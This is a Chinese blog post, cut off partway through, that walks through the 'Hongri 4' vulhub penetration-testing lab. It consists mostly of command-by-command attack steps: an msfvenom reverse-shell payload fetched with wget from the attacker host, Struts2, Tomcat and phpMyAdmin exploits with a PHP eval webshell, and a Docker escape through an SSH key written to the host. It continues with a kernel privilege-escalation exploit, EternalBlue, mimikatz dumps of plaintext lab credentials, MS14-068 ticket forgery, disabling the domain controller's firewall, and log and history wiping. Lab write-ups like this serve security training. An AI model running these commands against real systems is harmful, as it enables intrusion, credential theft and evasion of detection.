

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/logo.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="永安寺">
  <meta name="keywords" content="">
  
  <title>红日4 - Victory</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="红日4">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      永安寺
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-10-30 14:21" pubdate>
        2021年10月30日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.1k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      28
       分钟
    </span>
  

  
  
    
      <!-- LeanCloud 统计文章PV -->
      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">红日4</h1>
            
            <div class="markdown-body">
              <ul>
<li><h2 id="概念图"><a href="#概念图" class="headerlink" title="概念图"></a>概念图<img src="https://api2.mubu.com/v3/document_image/c5bc413d-e040-4255-a19c-0a061c6bea68-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></h2></li>
<li><p>直接开干</p>
</li>
<li><p>先进入ubuntu启动web</p>
</li>
<li><p>先开启3个环境<img src="https://api2.mubu.com/v3/document_image/717e8e04-f23e-4157-a8e4-ae6be7b5b865-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>命令：</p>
<ul>
<li><p>cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</p>
</li>
<li><p>sudo docker-compose up -d</p>
</li>
<li><p>cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</p>
</li>
<li><p>sudo docker-compose up -d</p>
</li>
<li><p>cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</p>
</li>
<li><p>sudo docker-compose up -d</p>
</li>
</ul>
</li>
<li><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
<li><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><ul>
<li><p>nmap扫描发现目标主机</p>
<ul>
<li><p>nmap -sS -T4 192.168.1.0/24 <img src="https://api2.mubu.com/v3/document_image/128352ed-b704-4125-ade4-80b1f303b4f9-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现目标：192.168.1.10 除了22端口 2001-2003全是web服务</p>
</li>
</ul>
</li>
</ul>
</li>
<li><h3 id="二、web入侵"><a href="#二、web入侵" class="headerlink" title="二、web入侵"></a>二、web入侵</h3><ul>
<li><p>1、Struts2框架漏洞Getshell</p>
<ul>
<li><p>先打开2001端口的web<img src="https://api2.mubu.com/v3/document_image/eae9428b-197b-46e0-9c8d-c77453a88545-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>是一个上传界面  </p>
</li>
<li><p>我们先随便上传一个文件</p>
</li>
<li><p>上传之后发现后缀是.action的<img src="https://api2.mubu.com/v3/document_image/c6a7e03f-9b0b-4b6e-bf5c-5e141ce226f8-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>推测是struts2框架</p>
</li>
<li><p>然后使用漏洞工具探测一波<img src="https://api2.mubu.com/v3/document_image/fae03b54-a190-47a5-bb42-f8fb59a5154c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现存在漏洞 且可执行命令  用msf上线</p>
</li>
<li><p>先在kali上生成msf木马 然后开一个http服务 将马放在服务上 供目标远程下载 因为目标出网</p>
<ul>
<li><p>命令：</p>
<ul>
<li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.96 LPORT=6666 -f elf &gt; shell.elf</p>
</li>
<li><p>python -m SimpleHTTPServer 80</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>然后目标远程下载 执行下载命令</p>
<ul>
<li><p>命令：</p>
<ul>
<li>wget <a target="_blank" rel="noopener" href="http://192.168.1.11/shell.elf">http://192.168.1.11/shell.elf</a></li>
</ul>
</li>
<li><p><img src="https://api2.mubu.com/v3/document_image/69a59434-c915-4672-94ac-22d313dea47d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
</ul>
</li>
<li><p>然后msf开启监听</p>
<ul>
<li><p>命令：</p>
<ul>
<li><p>use exploit/multi/handler</p>
</li>
<li><p>set lhost 0.0.0.0</p>
</li>
<li><p>set lport 6666</p>
</li>
<li><p>set payload linux/x86/meterpreter/reverse_tcp</p>
</li>
<li><p>run</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>然后在目标上执行shell.elf  先给权限<img src="https://api2.mubu.com/v3/document_image/64fe8287-bf41-4a96-8d6e-f575ae1805a6-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后执行<img src="https://api2.mubu.com/v3/document_image/6d0d4773-bd0e-4aaa-aa6e-c4607f85068e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后kali 收到会话<img src="https://api2.mubu.com/v3/document_image/466511ea-a15a-43e7-8188-5832d0dd2a5d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现是172开头的<img src="https://api2.mubu.com/v3/document_image/d0a84d94-6c60-4271-81d9-760d4a271974-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>怀疑是docker 先判断一波</p>
</li>
<li><p>用命令 cat  /proc/1/cgroup<img src="https://api2.mubu.com/v3/document_image/8b0c6830-d270-4059-981a-b2ff057b249b-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>判断docker方法：</p>
<ul>
<li><p>1、使用下面命令，查看是否存在 dockerrnv 文件  ls -alh /.dockerenv</p>
</li>
<li><p>2、查看系统进程的cgroup信息  cat /proc/1/cgroup</p>
</li>
</ul>
</li>
<li><p>确定是在docker中 所以进行docker逃逸</p>
</li>
</ul>
</li>
<li><p>2、Tomcat任意文件上传（CVE-2017-12615）Getshell</p>
<ul>
<li><p>打开2002端口  是一个tomcat页面 版本是8.5.19<img src="https://api2.mubu.com/v3/document_image/c9b6f85e-db58-4750-9c99-22c11e87b208-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/ccd220aa-b63c-4ac3-b2d7-b98c1529ac47-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>尝试put方法拿shell<img src="https://api2.mubu.com/v3/document_image/63c65591-4cb6-4ae6-8244-bcb3bc42ae7a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>冰蝎连接<img src="https://api2.mubu.com/v3/document_image/cb8667e8-8c57-4228-8ff5-7b9c766990a7-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>成功getshell</p>
</li>
</ul>
</li>
<li><p>3、PhPMyadmin <code>CVE-2018-12613</code> Getshell</p>
<ul>
<li><p>访问2003端口 是一个phpmyadmin<img src="https://api2.mubu.com/v3/document_image/98ed543e-d6f8-4f36-8988-947f25d21a39-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>尝试日志文件Getshell</p>
<ul>
<li><p>尝试将general log改为yes，提醒我们没有权限,好吧，日志文件getshell这条路是行不通了<img src="https://api2.mubu.com/v3/document_image/117b947d-afc7-48c7-85cc-717258316ca5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>利用百度搜索发现，phpmyadmin4.8.1后台存在漏洞CVE-2018-12613，利用Poc验证本服务器是否存在</p>
<ul>
<li><a href="http://192.168.1.10:2003/index.php?target=db_sql.php?/../../../../../../../../etc/passwd">http://192.168.1.10:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</a></li>
</ul>
</li>
<li><p>成功包含，存在此漏洞</p>
</li>
<li><p>漏洞利用</p>
<ul>
<li><p>1.利用SQL查询查询 select ‘<?php eval($_POST['cmd']);?>‘,将查询后的网页cookie</p>
</li>
<li><p>phpmyadmin:f29ab8338e5bebece0edf526c14416c4记录</p>
</li>
<li><p>2.包含Php-session文件getshell</p>
</li>
<li><p><img src="https://api2.mubu.com/v3/document_image/20e1f5fc-8fec-4305-b613-5ed5de08577e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><h3 id="三、Docker逃逸"><a href="#三、Docker逃逸" class="headerlink" title="三、Docker逃逸"></a>三、Docker逃逸</h3><ul>
<li><p>利用fdisk -l 查看挂载盘<img src="https://api2.mubu.com/v3/document_image/576cf65f-db61-49f8-8213-7482fc8464e5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>sda1盘疑似挂载于宿主机上，利用mount挂载于我们创建的目录之上</p>
</li>
<li><p>mkdir  shell</p>
</li>
<li><p>mount /dev/sda1  shell       </p>
</li>
<li><p>挂载成功，我们此时可以查看、修改宿主机的某些文件了。<img src="https://api2.mubu.com/v3/document_image/b4141f6c-6515-44cc-9cf3-34580824ebb8-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>写入ssh密钥进行docker逃逸</p>
<ul>
<li><p>先在kali中生成密钥  创建一个key文件<img src="https://api2.mubu.com/v3/document_image/312deac6-9689-4299-90c5-aa4fb74f1e50-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/b260adb4-0530-4fc2-86d3-efd98beb9643-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后将密钥复制</p>
</li>
<li><p>然后写入目标的.ssh目录下<img src="https://api2.mubu.com/v3/document_image/8b39a503-a8e6-4b65-a501-ec351459ae9b-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>命令：</p>
<ul>
<li><p>cp -avx /shell/home/ubuntu/.ssh/id_rsa.pub /shell/home/ubuntu/.ssh/authorized_keys</p>
</li>
<li><p>echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDW0uc8noTdYQIrZo5ODN0AyB4tmZlTF8mwxeVxccWCxrUkVwjhcfcmGq3czbgncMUoYh5vB1jWZSnakVfc4pAx3Yg/G4HVKu1q0JkCqrz8c1VJOpQAWoVjw8gCXpBk1rizX5nS4lkHAfZVJ0gb4grTGK31F+vbhN3OLIqteyUN7kJzWvvhD/iUiEDqVFKzllXIZGTr+kZioZfSxCJEZuI6ARbRDnKM/YHcdlfy0k64bYwWquCV8jxZOC5CYGr9Q6gPEO17a1szkNyTOGWNYk/oDQ2UpOT/PjObE3xk8eQrqnZFHQL23vTou3XOXoSp0C3DEdkr8aYE5bGUoet5n82QzZZixxCQIpuRvtvLHCQlBMiJZEB97gtivFZJXbFxV1QJpbrQDO/Q+HZTGH4rZnFMADDjbFhtWlb/uQqkZr38/hX7JxI8oewZcTKrF7tgc3jE/R33c/8OqNoYdv7LKqP//m7CEVUFE99GH5N+I3H8z6bQnARRhQ/1jKYLmK4+jXk= root@kali’ &gt; /hack/home/ubuntu/.ssh/authorized_keys</p>
</li>
<li><p>cat /hack/home/ubuntu/.ssh/authorized_keys</p>
</li>
</ul>
</li>
<li><p>然后用kali连接ubuntu</p>
<ul>
<li>这里要注意连接的时候需要根据生成key时候的名字 hack<img src="https://api2.mubu.com/v3/document_image/d5e4a5f6-5d05-42df-b871-4b20e74485dc-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>ubuntu提权</p>
<ul>
<li><p>先查看版本<img src="https://api2.mubu.com/v3/document_image/0b57b0f1-21b2-477d-8bff-88a567231590-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>根据志哥的wp  发现有一个新的exp可以提权  CVE-2021-3493</p>
</li>
<li><p>   EXP下载地址：<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
</li>
<li><p>影响版本</p>
<ul>
<li><p>Ubuntu 20.10</p>
</li>
<li><p>Ubuntu 20.04 LTS</p>
</li>
<li><p>Ubuntu 18.04 LTS</p>
</li>
<li><p>Ubuntu 16.04 LTS</p>
</li>
<li><p>Ubuntu 14.04 ESM</p>
</li>
</ul>
</li>
<li><p>编译并上传到服务器exp</p>
<ul>
<li><p>gcc exploit -o exp</p>
</li>
<li><p>python3 -m http.server 80</p>
</li>
<li><p>chmod 777 exp </p>
</li>
<li><p>./exp 失败…推测环境不一致导致编译后无法在目标主机环境运行，上传exploit.c，尝试在服务器上编译使用    <img src="https://api2.mubu.com/v3/document_image/8104228c-7cb4-4b59-ad21-8b02505563ad-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p> <a target="_blank" rel="noopener" href="http://192.168.1.11/exploit.c">http://192.168.1.11:80/exploit.c</a><img src="https://api2.mubu.com/v3/document_image/e65c87f4-15a9-452c-af25-145c6be53472-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>gcc exploit.c -o exp</p>
</li>
<li><p>./exp   <img src="https://api2.mubu.com/v3/document_image/9024fa8f-6490-4dc7-a005-327dc52f9085-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后重新弹一个root的shell回去<img src="https://api2.mubu.com/v3/document_image/f4ed57f4-3e1a-4ea3-a860-73b56b6d6d84-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><h3 id="四、内网横向"><a href="#四、内网横向" class="headerlink" title="四、内网横向"></a>四、内网横向</h3><ul>
<li><p>发现路由<img src="https://api2.mubu.com/v3/document_image/b28c7c9f-ca4e-4e0c-8588-57e88974b63a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>添加路由 命令：run autoroute -s 192.168.183.0/24<img src="https://api2.mubu.com/v3/document_image/38f48706-40e6-48cd-8664-6e7ce274b3d5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>开启socks代理</p>
<ul>
<li><p> use auxiliary/server/socks_proxy    </p>
</li>
<li><p>set srvhost 192.168.1.11</p>
</li>
<li><p>set version 4a socks版本   </p>
</li>
<li><p> run    </p>
</li>
</ul>
</li>
<li><p>信息收集 探测存存活主机</p>
<ul>
<li><p> use auxiliary/scanner/smb/smb_version </p>
</li>
<li><p>set rhosts 192.168.183.0/24</p>
</li>
<li><p>set timestampoutput 5 设置最大超时时间为5s</p>
</li>
<li><p>发现两个存活主机 以及域名demo<img src="https://api2.mubu.com/v3/document_image/2f519aad-d242-4911-9eae-591b24a81286-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
</ul>
</li>
<li><p>探测主机存活端口</p>
<ul>
<li><p>use auxiliary/scanner/portscan/tcp</p>
</li>
<li><p>set ports 135,445,80,443,1433,3306,53,8080,8888,7001 # 将常用端口添加并扫描set rhosts 192.168.183.130-131    #探测两台服务器          </p>
</li>
<li><p>130开了53 135 445<img src="https://api2.mubu.com/v3/document_image/7f8093b1-0443-46c4-808d-bac29a695b28-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>131开了135 445<img src="https://api2.mubu.com/v3/document_image/171dfb79-66b7-4b37-a68f-01768149fc23-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>因为都开 了135 445  用永恒之蓝扫一波</p>
</li>
</ul>
</li>
<li><p>永恒之蓝</p>
<ul>
<li><p>use auxiliary/scanner/smb/smb_ms17_010</p>
</li>
<li><p>set payload windows/x64/meterpreter/bind_tcp              </p>
</li>
<li><p>set rhosts 192.168.183.130-131</p>
</li>
<li><p>run<img src="https://api2.mubu.com/v3/document_image/c7336ed3-1afe-4772-9b64-a5a27caed7da-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>看样子两台都可能有  先打131</p>
<ul>
<li>这里图贴错了 不影响</li>
</ul>
</li>
<li><p>拿下131<img src="https://api2.mubu.com/v3/document_image/fbca5c61-d359-45a5-99cc-b371f00ec2a4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>开始域内信息收集:<img src="https://api2.mubu.com/v3/document_image/b6a67bf2-9f20-497f-a955-e3d7c72a1924-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>但执行域内信息收集的时候出现问题  一直报错<img src="https://api2.mubu.com/v3/document_image/1159a092-435c-41b3-83ee-fa2dace1d80e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>通过问志哥发现  说是当前用户不在域内 换一个用户收集</p>
</li>
<li><p>通过systeminfo发现当前是pc机  还有一个机器应该就是域控<img src="https://api2.mubu.com/v3/document_image/9784e981-e4a2-4388-ab0a-badc7b59574a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>先进行进程迁移到一个域用户<img src="https://api2.mubu.com/v3/document_image/b65c4c1e-059b-4a1d-ace3-dac986593164-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/9732fc4a-b7ba-449e-9899-8a14524ce3cd-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>迁移成功</p>
</li>
<li><p>现在就能成功进行相关的域信息收集<img src="https://api2.mubu.com/v3/document_image/c7a82ae6-f7c8-4cbf-b198-8ccd2e75c46f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>找到域控机器<img src="https://api2.mubu.com/v3/document_image/c26457a2-9757-4cf1-bcbb-b6837c848586-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>ip 192.168.183.130</p>
</li>
<li><p> DC机器名：<a target="_blank" rel="noopener" href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a>      </p>
</li>
<li><p> 域管用户 administrator                      </p>
</li>
<li><p>域用户sid</p>
<ul>
<li>demo\douser S-1-5-21-979886063-1111900045-1414766810-1107</li>
</ul>
</li>
<li><p>切换回高权限  然后用kiwi抓取密码<img src="https://api2.mubu.com/v3/document_image/cb954d28-1f29-4877-a7cd-2d8cd9c9ae64-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>抓取到了域用户的明文密码和hash 但是没有抓到域管的</p>
<ul>
<li>douser:Dotest123ntml:bc23b0b4d5bf5ff42bc61fb62e13886e sha1:c48096437367aad00ac2dc70552051cd84912a55      </li>
</ul>
</li>
<li><p>  使用smb连接了 但是无法执行命令<img src="https://api2.mubu.com/v3/document_image/0f41dfd0-67b9-44e2-b16e-49b639e4256f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>所以利用ms14-068域内漫游</p>
</li>
<li><p>切换到域用户然后上传exe </p>
</li>
<li><p>然后执行 利用ms14-068生成票据：               ms14-068.exe -u <a href="mailto:&#x64;&#x6f;&#117;&#x73;&#x65;&#114;&#64;&#100;&#101;&#109;&#x6f;&#46;&#x63;&#111;&#x6d;">&#x64;&#x6f;&#117;&#x73;&#x65;&#114;&#64;&#100;&#101;&#109;&#x6f;&#46;&#x63;&#111;&#x6d;</a> -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123          <img src="https://api2.mubu.com/v3/document_image/be7b8f35-6263-4f0a-ba28-102392b12289-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>​    然后利用mimiaktz将凭据导入内存<img src="https://api2.mubu.com/v3/document_image/491d3c22-f25e-4712-94dd-714749e16453-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>这里需要先清除目标的凭据</p>
<ul>
<li><p>mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p>
</li>
<li><p>mimikatz # kerberos::list          //查看当前机器凭证</p>
</li>
<li><p>mimikatz # kerberos::ptc &lt;生成的票据文件&gt;   //将票据注入到内存中</p>
</li>
</ul>
</li>
<li><p>mimikatz # kerberos::ptc <a href="mailto:&#x54;&#71;&#x54;&#x5f;&#100;&#111;&#117;&#115;&#101;&#114;&#x40;&#100;&#101;&#x6d;&#x6f;&#46;&#99;&#111;&#x6d;&#46;&#99;&#99;&#x61;&#99;&#104;&#x65;">&#x54;&#71;&#x54;&#x5f;&#100;&#111;&#117;&#115;&#101;&#114;&#x40;&#100;&#101;&#x6d;&#x6f;&#46;&#99;&#111;&#x6d;&#46;&#99;&#99;&#x61;&#99;&#104;&#x65;</a>              </p>
</li>
<li><p>然后dir \<a target="_blank" rel="noopener" href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a>\c$<img src="https://api2.mubu.com/v3/document_image/a2a8fd70-b98e-4460-8762-fb9be9f61072-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>凭据生效</p>
</li>
</ul>
</li>
<li><p>漫游DC</p>
<ul>
<li><p>先生成一个正向的shell 上传到pc win7上  然后copy到dc上<img src="https://api2.mubu.com/v3/document_image/a4d02b57-33f6-4c4f-8dc3-d6b489721ffb-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/16d1dde2-d344-4de4-9e35-f09ea9d3e835-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>关闭dc防火墙</p>
</li>
<li><p>sc \WIN-ENS2VR5TR3N create unablefirewall binpath= “netsh advfirewall set allprofiles state off”</p>
</li>
<li><p>sc \WIN-ENS2VR5TR3N start unablefirewall<img src="https://api2.mubu.com/v3/document_image/7b4eb2f7-067d-4578-bd14-fdcd50a258e0-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后将bind.exe传到dc<img src="https://api2.mubu.com/v3/document_image/c8ad58eb-d16a-420f-ae88-0213d8ad38b0-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>msf创建监听<img src="https://api2.mubu.com/v3/document_image/1379641e-1bd1-4ddd-965b-c6f94d0fcadc-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>创建服务执行msf马：</p>
<ul>
<li> sc \<a target="_blank" rel="noopener" href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a> create shell binpath= “c:\bind.exe”    创建执行正向shell的进程sc \<a target="_blank" rel="noopener" href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a> start shell        启动可以执行正向shell的服务       </li>
</ul>
</li>
<li><p>不知道是我的操作问题 还是环境问题 我一直出毛病</p>
</li>
<li><p>最后始终连不上       <img src="https://api2.mubu.com/v3/document_image/6ae49381-98a3-4f66-a260-a9c76f20f010-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/1722bc09-2e1c-4cf3-840a-ca056b9c6fe5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>后面的操作 也没多难 执行拿下dc 抓hash 抓密码等 就不继续操作了</p>
</li>
</ul>
</li>
</ul>
</li>
<li><h3 id="五、痕迹清理"><a href="#五、痕迹清理" class="headerlink" title="五、痕迹清理"></a>五、痕迹清理</h3><ul>
<li><p>Linux</p>
<ul>
<li><p>清除命令历史记录</p>
</li>
<li><p>histroy -r          #删除当前会话历史记录</p>
</li>
<li><p>history -c          #删除内存中的所有命令历史</p>
</li>
<li><p>rm .bash_history   #删除历史文件中的内容</p>
</li>
<li><p>HISTZISE=0          #通过设置历史命令条数来清除所有历史记录</p>
</li>
<li><p>在隐蔽的位置执行命令</p>
</li>
<li><p>使用vim打开文件执行命令</p>
</li>
<li><p>:set history=0</p>
</li>
<li><p>:!command</p>
</li>
<li><p>linux日志文件</p>
</li>
<li><p>/var/run/utmp 记录现在登入的用户</p>
</li>
<li><p>/var/log/wtmp 记录用户所有的登入和登出</p>
</li>
<li><p>/var/log/lastlog 记录每一个用户最后登入时间</p>
</li>
<li><p>/var/log/btmp 记录错误的登入尝试</p>
</li>
<li><p>/var/log/auth.log 需要身份确认的操作</p>
</li>
